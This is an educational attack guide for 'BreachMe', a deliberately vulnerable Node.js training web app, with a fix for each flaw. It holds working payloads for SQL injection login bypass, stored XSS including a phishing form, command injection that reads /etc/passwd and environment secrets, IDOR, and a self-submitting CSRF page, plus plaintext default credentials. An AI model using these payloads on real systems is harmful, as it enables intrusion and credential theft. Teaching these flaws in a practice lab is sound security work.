# 🔓 BreachMe — Attack Guide & Hosting Instructions

> ⚠️ **DISCLAIMER**: This guide is for **educational purposes only**. Only attack systems you own or have explicit permission to test.

---

## 📖 How This Website Works

This is a **deliberately vulnerable** web application. Think of it like a practice target at a shooting range — it's designed to be attacked so you can learn how real vulnerabilities work.

The website is built with:
- **Node.js** — runs the server (like the brain of the website)
- **Express** — handles URL routes (decides what to show when you visit a page)
- **SQLite** — stores data like usernames, passwords, and comments (a simple database)
- **EJS** — creates the HTML pages (templates that mix code with HTML)

---

## 🎯 Vulnerability #1: SQL Injection

### 📍 Where: Login Page (`/login`)

### 🧠 What is SQL Injection? (Simple Explanation)

Think of it like this: The website creates a **question to ask the database**:

```
"Hey database, is there a user with name 'john' AND password 'password1'?"
```

The code looks like this:
```sql
SELECT * FROM users WHERE username = 'john' AND password = 'password1'
```

But the website **doesn't check what you type**. So if you type `' OR 1=1 --` as your username, the question becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```

- `' ` — closes the username string early
- `OR 1=1` — makes the condition always true (1 always equals 1!)
- `--` — comments out the rest (the password check is ignored)

**Result**: The database returns the first user (admin), and you're logged in!

### 🎮 Try These Attacks

| Username | Password | What happens |
|----------|----------|-------------|
| `' OR 1=1 --` | anything | Login as admin (first user in DB) |
| `' OR username='alice' --` | anything | Login specifically as alice |
| `admin'--` | anything | Login as admin by commenting out password check |

### 🛡️ How to Fix

```javascript
// ❌ VULNERABLE (string concatenation)
const query = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ SAFE (parameterized query)
const user = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?').get(username, password);
```

---

## 🎯 Vulnerability #2: Stored XSS (Cross-Site Scripting)

### 📍 Where: Guestbook Page (`/guestbook`)

### 🧠 What is Stored XSS? (Simple Explanation)

Imagine writing a comment on a website. Normally, you write text like "Hello!". But what if you write **JavaScript code** instead? If the website doesn't clean your input, it saves your code in the database and **runs it on every visitor's browser**.

It's like leaving a booby trap that triggers for everyone who reads the page.

### 🎮 Try These Attacks

1. **Basic Alert Box** — Post this as a message:
   ```html
   <script>alert('You have been hacked!')</script>
   ```
   Every visitor will see a popup alert.

2. **Cookie Stealing** — Post this (while logged in):
   ```html
   <script>alert('Your cookies: ' + document.cookie)</script>
   ```
   This shows the victim's session cookies. A real attacker would send these to their own server.

3. **Page Defacement** — Post this:
   ```html
   <script>document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:200px">HACKED BY YOU!</h1>'</script>
   ```
   Replaces the entire page content.

4. **Fake Login Form** — Post this:
   ```html
   <div style="background:#111;padding:20px;border-radius:10px">
     <h3 style="color:white">Session Expired! Please re-login:</h3>
     <input placeholder="Username" style="display:block;margin:5px 0;padding:8px;width:100%">
     <input type="password" placeholder="Password" style="display:block;margin:5px 0;padding:8px;width:100%">
     <button style="padding:8px 20px;background:#8b5cf6;color:white;border:none;border-radius:5px;cursor:pointer">Login</button>
   </div>
   ```
   Creates a convincing fake login form to phish credentials.

### 🛡️ How to Fix

```javascript
// ❌ VULNERABLE (renders raw HTML in EJS)
<%- userMessage %>

// ✅ SAFE (auto-escapes HTML characters)
<%= userMessage %>
// Turns <script> into &lt;script&gt; which displays as text, not code
```

---

## 🎯 Vulnerability #3: Command Injection

### 📍 Where: Network Tools Page (`/tools`)

### 🧠 What is Command Injection? (Simple Explanation)

The website has a "ping" tool. When you type `google.com`, the server runs:
```bash
ping -c 2 google.com
```

But you can type a **semicolon** `;` to chain another command:
```bash
ping -c 2 google.com; whoami
```
The server runs BOTH commands: the ping AND `whoami`. You now have **remote code execution** — you can run any command on the server!

### 🎮 Try These Attacks

| Enter in the ping box | What it does |
|-----------------------|-------------|
| `127.0.0.1; whoami` | Shows who the server is running as |
| `127.0.0.1; ls -la` | Lists all files in the server directory |
| `127.0.0.1; cat server.js` | Reads the entire server source code! |
| `127.0.0.1; cat /etc/passwd` | Reads the system's user list |
| `127.0.0.1; env` | Shows environment variables (may contain API keys) |
| `127.0.0.1; uname -a` | Shows operating system information |
| <code>127.0.0.1 &#124; id</code> | Shows user/group information (using pipe instead of semicolon) |

### 🛡️ How to Fix

```javascript
// ❌ VULNERABLE (user input in shell command)
execSync(`ping -c 2 ${userInput}`);

// ✅ SAFE (validate input, no shell)
if (/^[a-zA-Z0-9.\-]+$/.test(userInput)) {
  execFileSync('ping', ['-c', '2', userInput]); // execFileSync doesn't use a shell
}
```

---

## 🎯 Vulnerability #4: IDOR (Insecure Direct Object Reference)

### 📍 Where: Profile Page (`/profile/:id`)

### 🧠 What is IDOR? (Simple Explanation)

When you're logged in, your profile URL is `/profile/1` (if your user ID is 1). The website loads the user with **whatever ID is in the URL** — it never checks if that's actually YOUR profile.

So you just change the number and see **anyone's data**, including their password and secret notes!

### 🎮 Try These Attacks

1. Login with any account (e.g., `john` / `password1`)
2. Visit your profile — notice the URL says `/profile/2`
3. Now change the URL to:
   - `/profile/1` → **Admin's profile** (has a secret admin key!)
   - `/profile/3` → Alice's profile
   - `/profile/4` → Bob's profile (has his bank PIN!)
4. You can see everyone's **password**, **email**, and **secret notes**

### 🛡️ How to Fix

```javascript
// ❌ VULNERABLE (no authorization check)
app.get('/profile/:id', (req, res) => {
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);
  res.render('profile', { user }); // Shows anyone's data!
});

// ✅ SAFE (verify ownership)
app.get('/profile/:id', (req, res) => {
  if (req.params.id != loggedInUser.id && loggedInUser.role !== 'admin') {
    return res.status(403).send('Access denied');
  }
  // ... proceed only if authorized
});
```

---

## 🎯 Vulnerability #5: CSRF (Cross-Site Request Forgery)

### 📍 Where: Change Password Page (`/change-password`)

### 🧠 What is CSRF? (Simple Explanation)

Imagine you're logged into BreachMe. An attacker sends you a link to their website. When you visit it, their page contains a **hidden form** that automatically submits a password change request to BreachMe.

Your browser **automatically includes your cookies** (because you're logged in to BreachMe), so the server thinks it's a legitimate request from you. Your password is changed without you knowing!

### 🎮 Try This Attack

1. **Login** to BreachMe in your browser
2. **Create a file** called `csrf_attack.html` on your computer with this content:

```html
<!DOCTYPE html>
<html>
<head><title>You Won a Prize!</title></head>
<body>
  <h1>🎉 Congratulations! Click to claim your prize!</h1>
  <!-- This secretly changes the victim's password -->
  <form method="POST" action="http://localhost:3000/change-password" id="csrf-form">
    <input type="hidden" name="new_password" value="hacked123">
  </form>
  <script>
    // Automatically submit the form when the page loads
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

3. **Open** `csrf_attack.html` in the same browser where you're logged in
4. Your password is now `hacked123`! Try logging out and logging back in with the old password — it won't work.

### 🛡️ How to Fix

```javascript
// ✅ SAFE: Generate a CSRF token per session
app.get('/change-password', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken;
  res.render('change-password', { csrfToken });
});

app.post('/change-password', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('CSRF token invalid');
  }
  // Also require the CURRENT password before changing
});
```

---

## 🎁 Bonus: Hidden API Data Leak

### 📍 Where: `/api/users`

Visit `http://localhost:3000/api/users` in your browser. It returns **ALL user data as JSON**, including usernames, passwords, emails, and secret notes. This endpoint has:
- ❌ No authentication required
- ❌ No rate limiting
- ❌ Passwords stored in plain text (not hashed)

---

## 🔧 Running Locally

```bash
# 1. Install dependencies
npm install

# 2. Start the server
npm start

# 3. Open in browser
# → http://localhost:3000
```

### Default Login Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | Admin |
| john | password1 | User |
| alice | letmein | User |
| bob | qwerty | User |

---

© 2026 Jithu Francis. All rights reserved.